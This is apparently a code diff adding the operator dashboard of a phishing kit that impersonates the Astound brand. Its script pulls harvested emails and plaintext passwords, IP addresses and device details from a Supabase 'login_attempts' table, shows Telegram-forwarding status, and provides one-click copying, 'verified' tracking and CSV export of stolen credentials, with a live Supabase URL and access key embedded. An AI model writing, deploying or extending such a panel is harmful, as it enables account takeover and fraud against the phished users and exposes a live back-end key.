@@ -1,0 +1,763 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login Verification Dashboard - Astound</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+      background: linear-gradient(135deg, #2c3e50 0%, #34495e 100%);
+      min-height: 100vh;
+      padding: 20px;
+    }
+
+    .container {
+      max-width: 1600px;
+      margin: 0 auto;
+    }
+
+    .header {
+      background: white;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+      margin-bottom: 30px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .header h1 {
+      font-size: 32px;
+      color: #1a202c;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .live-indicator {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      background: #48bb78;
+      color: white;
+      padding: 8px 16px;
+      border-radius: 20px;
+      font-size: 14px;
+      font-weight: 600;
+    }
+
+    .live-dot {
+      width: 8px;
+      height: 8px;
+      background: white;
+      border-radius: 50%;
+      animation: pulse 2s infinite;
+    }
+
+    @keyframes pulse {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.5; }
+    }
+
+    .stats {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+      gap: 20px;
+      margin-bottom: 30px;
+    }
+
+    .stat-card {
+      background: white;
+      padding: 25px;
+      border-radius: 12px;
+      box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+    }
+
+    .stat-card h3 {
+      color: #718096;
+      font-size: 14px;
+      font-weight: 600;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      margin-bottom: 10px;
+    }
+
+    .stat-card .value {
+      font-size: 36px;
+      font-weight: bold;
+      color: #2c3e50;
+    }
+
+    .filters {
+      background: white;
+      padding: 20px 30px;
+      border-radius: 12px;
+      box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+      margin-bottom: 20px;
+      display: flex;
+      gap: 15px;
+      flex-wrap: wrap;
+      align-items: center;
+    }
+
+    .filter-btn {
+      padding: 10px 20px;
+      border: 2px solid #e2e8f0;
+      background: white;
+      border-radius: 8px;
+      cursor: pointer;
+      font-size: 14px;
+      font-weight: 600;
+      transition: all 0.2s;
+    }
+
+    .filter-btn:hover {
+      background: #f7fafc;
+    }
+
+    .filter-btn.active {
+      background: #2c3e50;
+      color: white;
+      border-color: #2c3e50;
+    }
+
+    .search-box {
+      flex: 1;
+      min-width: 250px;
+    }
+
+    .search-box input {
+      width: 100%;
+      padding: 10px 15px;
+      border: 2px solid #e2e8f0;
+      border-radius: 8px;
+      font-size: 14px;
+    }
+
+    .search-box input:focus {
+      outline: none;
+      border-color: #2c3e50;
+    }
+
+    .attempts {
+      background: white;
+      border-radius: 12px;
+      box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+      overflow: hidden;
+    }
+
+    .attempts-header {
+      padding: 25px 30px;
+      border-bottom: 1px solid #e2e8f0;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .attempts-header h2 {
+      font-size: 24px;
+      color: #1a202c;
+    }
+
+    .export-btn {
+      padding: 10px 20px;
+      background: #48bb78;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      font-size: 14px;
+      font-weight: 600;
+      transition: all 0.2s;
+    }
+
+    .export-btn:hover {
+      background: #38a169;
+    }
+
+    .attempts-list {
+      max-height: 600px;
+      overflow-y: auto;
+    }
+
+    .attempt-item {
+      padding: 20px 30px;
+      border-bottom: 1px solid #e2e8f0;
+      transition: background 0.2s;
+    }
+
+    .attempt-item:hover {
+      background: #f7fafc;
+    }
+
+    .attempt-item.verified {
+      background: #f0fff4;
+    }
+
+    .attempt-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: flex-start;
+      margin-bottom: 15px;
+    }
+
+    .attempt-email {
+      font-size: 18px;
+      font-weight: 600;
+      color: #1a202c;
+      font-family: 'Courier New', monospace;
+    }
+
+    .attempt-time {
+      font-size: 14px;
+      color: #718096;
+    }
+
+    .credential-box {
+      background: #2d3748;
+      color: #e2e8f0;
+      padding: 15px;
+      border-radius: 8px;
+      margin: 15px 0;
+      font-family: 'Courier New', monospace;
+      font-size: 14px;
+      position: relative;
+    }
+
+    .credential-row {
+      display: flex;
+      gap: 10px;
+      margin-bottom: 8px;
+    }
+
+    .credential-row:last-child {
+      margin-bottom: 0;
+    }
+
+    .credential-label {
+      color: #a0aec0;
+      min-width: 80px;
+    }
+
+    .credential-value {
+      color: #48bb78;
+      word-break: break-all;
+    }
+
+    .password-value {
+      color: #fc8181;
+      font-weight: bold;
+    }
+
+    .copy-btn {
+      position: absolute;
+      top: 10px;
+      right: 10px;
+      padding: 6px 12px;
+      background: #4a5568;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+      font-size: 12px;
+      transition: all 0.2s;
+    }
+
+    .copy-btn:hover {
+      background: #2d3748;
+    }
+
+    .metadata {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+      gap: 12px;
+      margin-bottom: 15px;
+    }
+
+    .meta-item {
+      font-size: 13px;
+    }
+
+    .meta-label {
+      color: #718096;
+      margin-right: 8px;
+    }
+
+    .meta-value {
+      color: #2d3748;
+      font-weight: 500;
+    }
+
+    .actions {
+      display: flex;
+      gap: 10px;
+      margin-top: 15px;
+    }
+
+    .action-btn {
+      padding: 8px 16px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      font-size: 13px;
+      font-weight: 600;
+      transition: all 0.2s;
+    }
+
+    .verify-btn {
+      background: #48bb78;
+      color: white;
+    }
+
+    .verify-btn:hover {
+      background: #38a169;
+    }
+
+    .unverify-btn {
+      background: #ed8936;
+      color: white;
+    }
+
+    .unverify-btn:hover {
+      background: #dd6b20;
+    }
+
+    .delete-btn {
+      background: #fc8181;
+      color: white;
+    }
+
+    .delete-btn:hover {
+      background: #f56565;
+    }
+
+    .notes-section {
+      margin-top: 15px;
+    }
+
+    .notes-input {
+      width: 100%;
+      padding: 10px;
+      border: 2px solid #e2e8f0;
+      border-radius: 6px;
+      font-size: 13px;
+      font-family: inherit;
+      resize: vertical;
+      min-height: 60px;
+    }
+
+    .notes-input:focus {
+      outline: none;
+      border-color: #2c3e50;
+    }
+
+    .status-badge {
+      display: inline-block;
+      padding: 4px 12px;
+      border-radius: 12px;
+      font-size: 12px;
+      font-weight: 600;
+      text-transform: uppercase;
+    }
+
+    .status-verified {
+      background: #c6f6d5;
+      color: #22543d;
+    }
+
+    .status-pending {
+      background: #fed7d7;
+      color: #c53030;
+    }
+
+    .telegram-badge {
+      background: #bee3f8;
+      color: #2c5282;
+    }
+
+    .loading {
+      text-align: center;
+      padding: 60px;
+      color: #718096;
+      font-size: 18px;
+    }
+
+    .empty-state {
+      text-align: center;
+      padding: 60px;
+      color: #718096;
+    }
+
+    .empty-state svg {
+      width: 100px;
+      height: 100px;
+      margin-bottom: 20px;
+      opacity: 0.5;
+    }
+
+    @media (max-width: 768px) {
+      .header {
+        flex-direction: column;
+        align-items: flex-start;
+        gap: 15px;
+      }
+
+      .filters {
+        flex-direction: column;
+      }
+
+      .filter-btn {
+        width: 100%;
+      }
+
+      .metadata {
+        grid-template-columns: 1fr;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <h1>🔐 Login Verification Dashboard</h1>
+      <div class="live-indicator">
+        <div class="live-dot"></div>
+        LIVE
+      </div>
+    </div>
+
+    <div class="stats">
+      <div class="stat-card">
+        <h3>Total Attempts</h3>
+        <div class="value" id="stat-total">0</div>
+      </div>
+      <div class="stat-card">
+        <h3>Today</h3>
+        <div class="value" id="stat-today">0</div>
+      </div>
+      <div class="stat-card">
+        <h3>Last Hour</h3>
+        <div class="value" id="stat-hour">0</div>
+      </div>
+      <div class="stat-card">
+        <h3>Pending</h3>
+        <div class="value" id="stat-pending">0</div>
+      </div>
+      <div class="stat-card">
+        <h3>Verified</h3>
+        <div class="value" id="stat-verified">0</div>
+      </div>
+    </div>
+
+    <div class="filters">
+      <button class="filter-btn active" data-filter="all">All</button>
+      <button class="filter-btn" data-filter="pending">Pending</button>
+      <button class="filter-btn" data-filter="verified">Verified</button>
+      <button class="filter-btn" data-filter="today">Today</button>
+      <div class="search-box">
+        <input type="text" id="search-input" placeholder="Search by email or IP...">
+      </div>
+    </div>
+
+    <div class="attempts">
+      <div class="attempts-header">
+        <h2>Login Attempts</h2>
+        <button class="export-btn" onclick="exportToCSV()">📥 Export CSV</button>
+      </div>
+      <div id="attempts-list" class="attempts-list">
+        <div class="loading">Loading login attempts...</div>
+      </div>
+    </div>
+  </div>
+
+  <script type="module">
+    import { createClient } from 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/+esm';
+
+    const SUPABASE_URL = 'https://qielniwrgjgkfzmyhveg.supabase.co';
+    const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InFpZWxuaXdyZ2pna2Z6bXlodmVnIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjQ0NTk2MDQsImV4cCI6MjA4MDAzNTYwNH0.bcWZFeJEeyGyuo9g7xmo5UW92MZPnHG9hDTZ0U_zDPM';
+
+    const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);
+
+    let allAttempts = [];
+    let currentFilter = 'all';
+    let searchQuery = '';
+
+    async function loadAttempts() {
+      try {
+        const { data, error } = await supabase
+          .from('login_attempts')
+          .select('*')
+          .order('created_at', { ascending: false })
+          .limit(500);
+
+        if (error) throw error;
+
+        allAttempts = data || [];
+        updateStats();
+        renderAttempts();
+      } catch (error) {
+        console.error('Error loading attempts:', error);
+        document.getElementById('attempts-list').innerHTML =
+          '<div class="loading">Failed to load attempts. Please refresh.</div>';
+      }
+    }
+
+    function updateStats() {
+      const total = allAttempts.length;
+      const now = new Date();
+      const today = allAttempts.filter(a => {
+        const date = new Date(a.created_at);
+        return date.toDateString() === now.toDateString();
+      }).length;
+
+      const hourAgo = new Date(now - 3600000);
+      const lastHour = allAttempts.filter(a =>
+        new Date(a.created_at) >= hourAgo
+      ).length;
+
+      const pending = allAttempts.filter(a => !a.verified).length;
+      const verified = allAttempts.filter(a => a.verified).length;
+
+      document.getElementById('stat-total').textContent = total;
+      document.getElementById('stat-today').textContent = today;
+      document.getElementById('stat-hour').textContent = lastHour;
+      document.getElementById('stat-pending').textContent = pending;
+      document.getElementById('stat-verified').textContent = verified;
+    }
+
+    function filterAttempts() {
+      return allAttempts.filter(a => {
+        if (currentFilter === 'pending' && a.verified) return false;
+        if (currentFilter === 'verified' && !a.verified) return false;
+        if (currentFilter === 'today') {
+          const date = new Date(a.created_at);
+          const now = new Date();
+          if (date.toDateString() !== now.toDateString()) return false;
+        }
+
+        if (searchQuery) {
+          const query = searchQuery.toLowerCase();
+          return a.email.toLowerCase().includes(query) ||
+                 (a.ip_address && a.ip_address.toLowerCase().includes(query));
+        }
+
+        return true;
+      });
+    }
+
+    function renderAttempts() {
+      const filtered = filterAttempts();
+      const listEl = document.getElementById('attempts-list');
+
+      if (filtered.length === 0) {
+        listEl.innerHTML = `
+          <div class="empty-state">
+            <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20 13V6a2 2 0 00-2-2H6a2 2 0 00-2 2v7m16 0v5a2 2 0 01-2 2H6a2 2 0 01-2-2v-5m16 0h-2.586a1 1 0 00-.707.293l-2.414 2.414a1 1 0 01-.707.293h-3.172a1 1 0 01-.707-.293l-2.414-2.414A1 1 0 006.586 13H4"></path>
+            </svg>
+            <div style="font-size: 18px; margin-bottom: 10px;">No login attempts found</div>
+            <div style="font-size: 14px;">Attempts will appear here when users submit the login form</div>
+          </div>
+        `;
+        return;
+      }
+
+      listEl.innerHTML = filtered.map(attempt => {
+        const date = new Date(attempt.created_at);
+        const timeAgo = getTimeAgo(date);
+        const screenInfo = JSON.parse(attempt.screen_info || '{}');
+
+        return `
+          <div class="attempt-item ${attempt.verified ? 'verified' : ''}" data-id="${attempt.id}">
+            <div class="attempt-header">
+              <div>
+                <div class="attempt-email">${escapeHtml(attempt.email)}</div>
+                <span class="status-badge ${attempt.verified ? 'status-verified' : 'status-pending'}">
+                  ${attempt.verified ? '✓ Verified' : 'Pending'}
+                </span>
+                ${attempt.telegram_sent ? '<span class="status-badge telegram-badge">📱 Telegram Sent</span>' : ''}
+              </div>
+              <div class="attempt-time">${timeAgo}</div>
+            </div>
+
+            <div class="credential-box">
+              <button class="copy-btn" onclick="window.copyCredentials('${escapeHtml(attempt.email)}', '${escapeHtml(attempt.password)}')">📋 Copy</button>
+              <div class="credential-row">
+                <span class="credential-label">Email:</span>
+                <span class="credential-value">${escapeHtml(attempt.email)}</span>
+              </div>
+              <div class="credential-row">
+                <span class="credential-label">Password:</span>
+                <span class="password-value">${escapeHtml(attempt.password)}</span>
+              </div>
+            </div>
+
+            <div class="metadata">
+              <div class="meta-item">
+                <span class="meta-label">IP:</span>
+                <span class="meta-value">${escapeHtml(attempt.ip_address || 'N/A')}</span>
+              </div>
+              <div class="meta-item">
+                <span class="meta-label">Browser:</span>
+                <span class="meta-value">${screenInfo.browser || 'Unknown'}</span>
+              </div>
+              <div class="meta-item">
+                <span class="meta-label">OS:</span>
+                <span class="meta-value">${screenInfo.os || 'Unknown'}</span>
+              </div>
+              <div class="meta-item">
+                <span class="meta-label">Screen:</span>
+                <span class="meta-value">${screenInfo.screenWidth}x${screenInfo.screenHeight}</span>
+              </div>
+              <div class="meta-item">
+                <span class="meta-label">Time:</span>
+                <span class="meta-value">${date.toLocaleString()}</span>
+              </div>
+              <div class="meta-item">
+                <span class="meta-label">Timezone:</span>
+                <span class="meta-value">${screenInfo.timezone || 'Unknown'}</span>
+              </div>
+            </div>
+
+            <div class="notes-section">
+              <textarea class="notes-input" placeholder="Add notes..." onchange="window.updateNotes('${attempt.id}', this.value)">${escapeHtml(attempt.notes || '')}</textarea>
+            </div>
+
+            <div class="actions">
+              ${!attempt.verified ?
+                `<button class="action-btn verify-btn" onclick="window.markVerified('${attempt.id}', true)">✓ Mark Verified</button>` :
+                `<button class="action-btn unverify-btn" onclick="window.markVerified('${attempt.id}', false)">↺ Unverify</button>`
+              }
+              <button class="action-btn delete-btn" onclick="window.deleteAttempt('${attempt.id}')">🗑 Delete</button>
+            </div>
+          </div>
+        `;
+      }).join('');
+    }
+
+    function getTimeAgo(date) {
+      const seconds = Math.floor((new Date() - date) / 1000);
+      if (seconds < 60) return 'just now';
+      if (seconds < 3600) return `${Math.floor(seconds / 60)}m ago`;
+      if (seconds < 86400) return `${Math.floor(seconds / 3600)}h ago`;
+      return `${Math.floor(seconds / 86400)}d ago`;
+    }
+
+    function escapeHtml(text) {
+      const div = document.createElement('div');
+      div.textContent = text || '';
+      return div.innerHTML;
+    }
+
+    window.markVerified = async function(id, verified) {
+      try {
+        const { error } = await supabase
+          .from('login_attempts')
+          .update({
+            verified: verified,
+            verified_at: verified ? new Date().toISOString() : null
+          })
+          .eq('id', id);
+
+        if (error) throw error;
+        await loadAttempts();
+      } catch (error) {
+        console.error('Error updating verification:', error);
+        alert('Failed to update verification status');
+      }
+    };
+
+    window.updateNotes = async function(id, notes) {
+      try {
+        const { error } = await supabase
+          .from('login_attempts')
+          .update({ notes: notes })
+          .eq('id', id);
+
+        if (error) throw error;
+      } catch (error) {
+        console.error('Error updating notes:', error);
+      }
+    };
+
+    window.deleteAttempt = async function(id) {
+      if (!confirm('Are you sure you want to delete this login attempt?')) return;
+
+      try {
+        const { error } = await supabase
+          .from('login_attempts')
+          .delete()
+          .eq('id', id);
+
+        if (error) throw error;
+        await loadAttempts();
+      } catch (error) {
+        console.error('Error deleting attempt:', error);
+        alert('Failed to delete attempt');
+      }
+    };
+
+    window.copyCredentials = function(email, password) {
+      const text = `Email: ${email}\nPassword: ${password}`;
+      navigator.clipboard.writeText(text).then(() => {
+        alert('Credentials copied to clipboard!');
+      }).catch(err => {
+        console.error('Failed to copy:', err);
+      });
+    };
+
+    window.exportToCSV = function() {
+      const filtered = filterAttempts();
+      const csv = [
+        ['Email', 'Password', 'IP Address', 'Timestamp', 'Verified', 'Browser', 'OS', 'Notes'].join(','),
+        ...filtered.map(a => {
+          const screenInfo = JSON.parse(a.screen_info || '{}');
+          return [
+            `"${a.email}"`,
+            `"${a.password}"`,
+            `"${a.ip_address || ''}"`,
+            `"${new Date(a.created_at).toLocaleString()}"`,
+            a.verified ? 'Yes' : 'No',
+            `"${screenInfo.browser || ''}"`,
+            `"${screenInfo.os || ''}"`,
+            `"${(a.notes || '').replace(/"/g, '""')}"`
+          ].join(',');
+        })
+      ].join('\n');
+
+      const blob = new Blob([csv], { type: 'text/csv' });
+      const url = window.URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = `login-attempts-${new Date().toISOString().split('T')[0]}.csv`;
+      a.click();
+      window.URL.revokeObjectURL(url);
+    };
+
+    document.querySelectorAll('.filter-btn').forEach(btn => {
+      btn.addEventListener('click', () => {
+        document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
+        btn.classList.add('active');
+        currentFilter = btn.dataset.filter;
+        renderAttempts();
+      });
+    });
+
+    document.getElementById('search-input').addEventListener('input', (e) => {
+      searchQuery = e.target.value;
+      renderAttempts();
+    });
+
+    loadAttempts();
+    setInterval(loadAttempts, 15000);
+  </script>
+</body>
+</html>
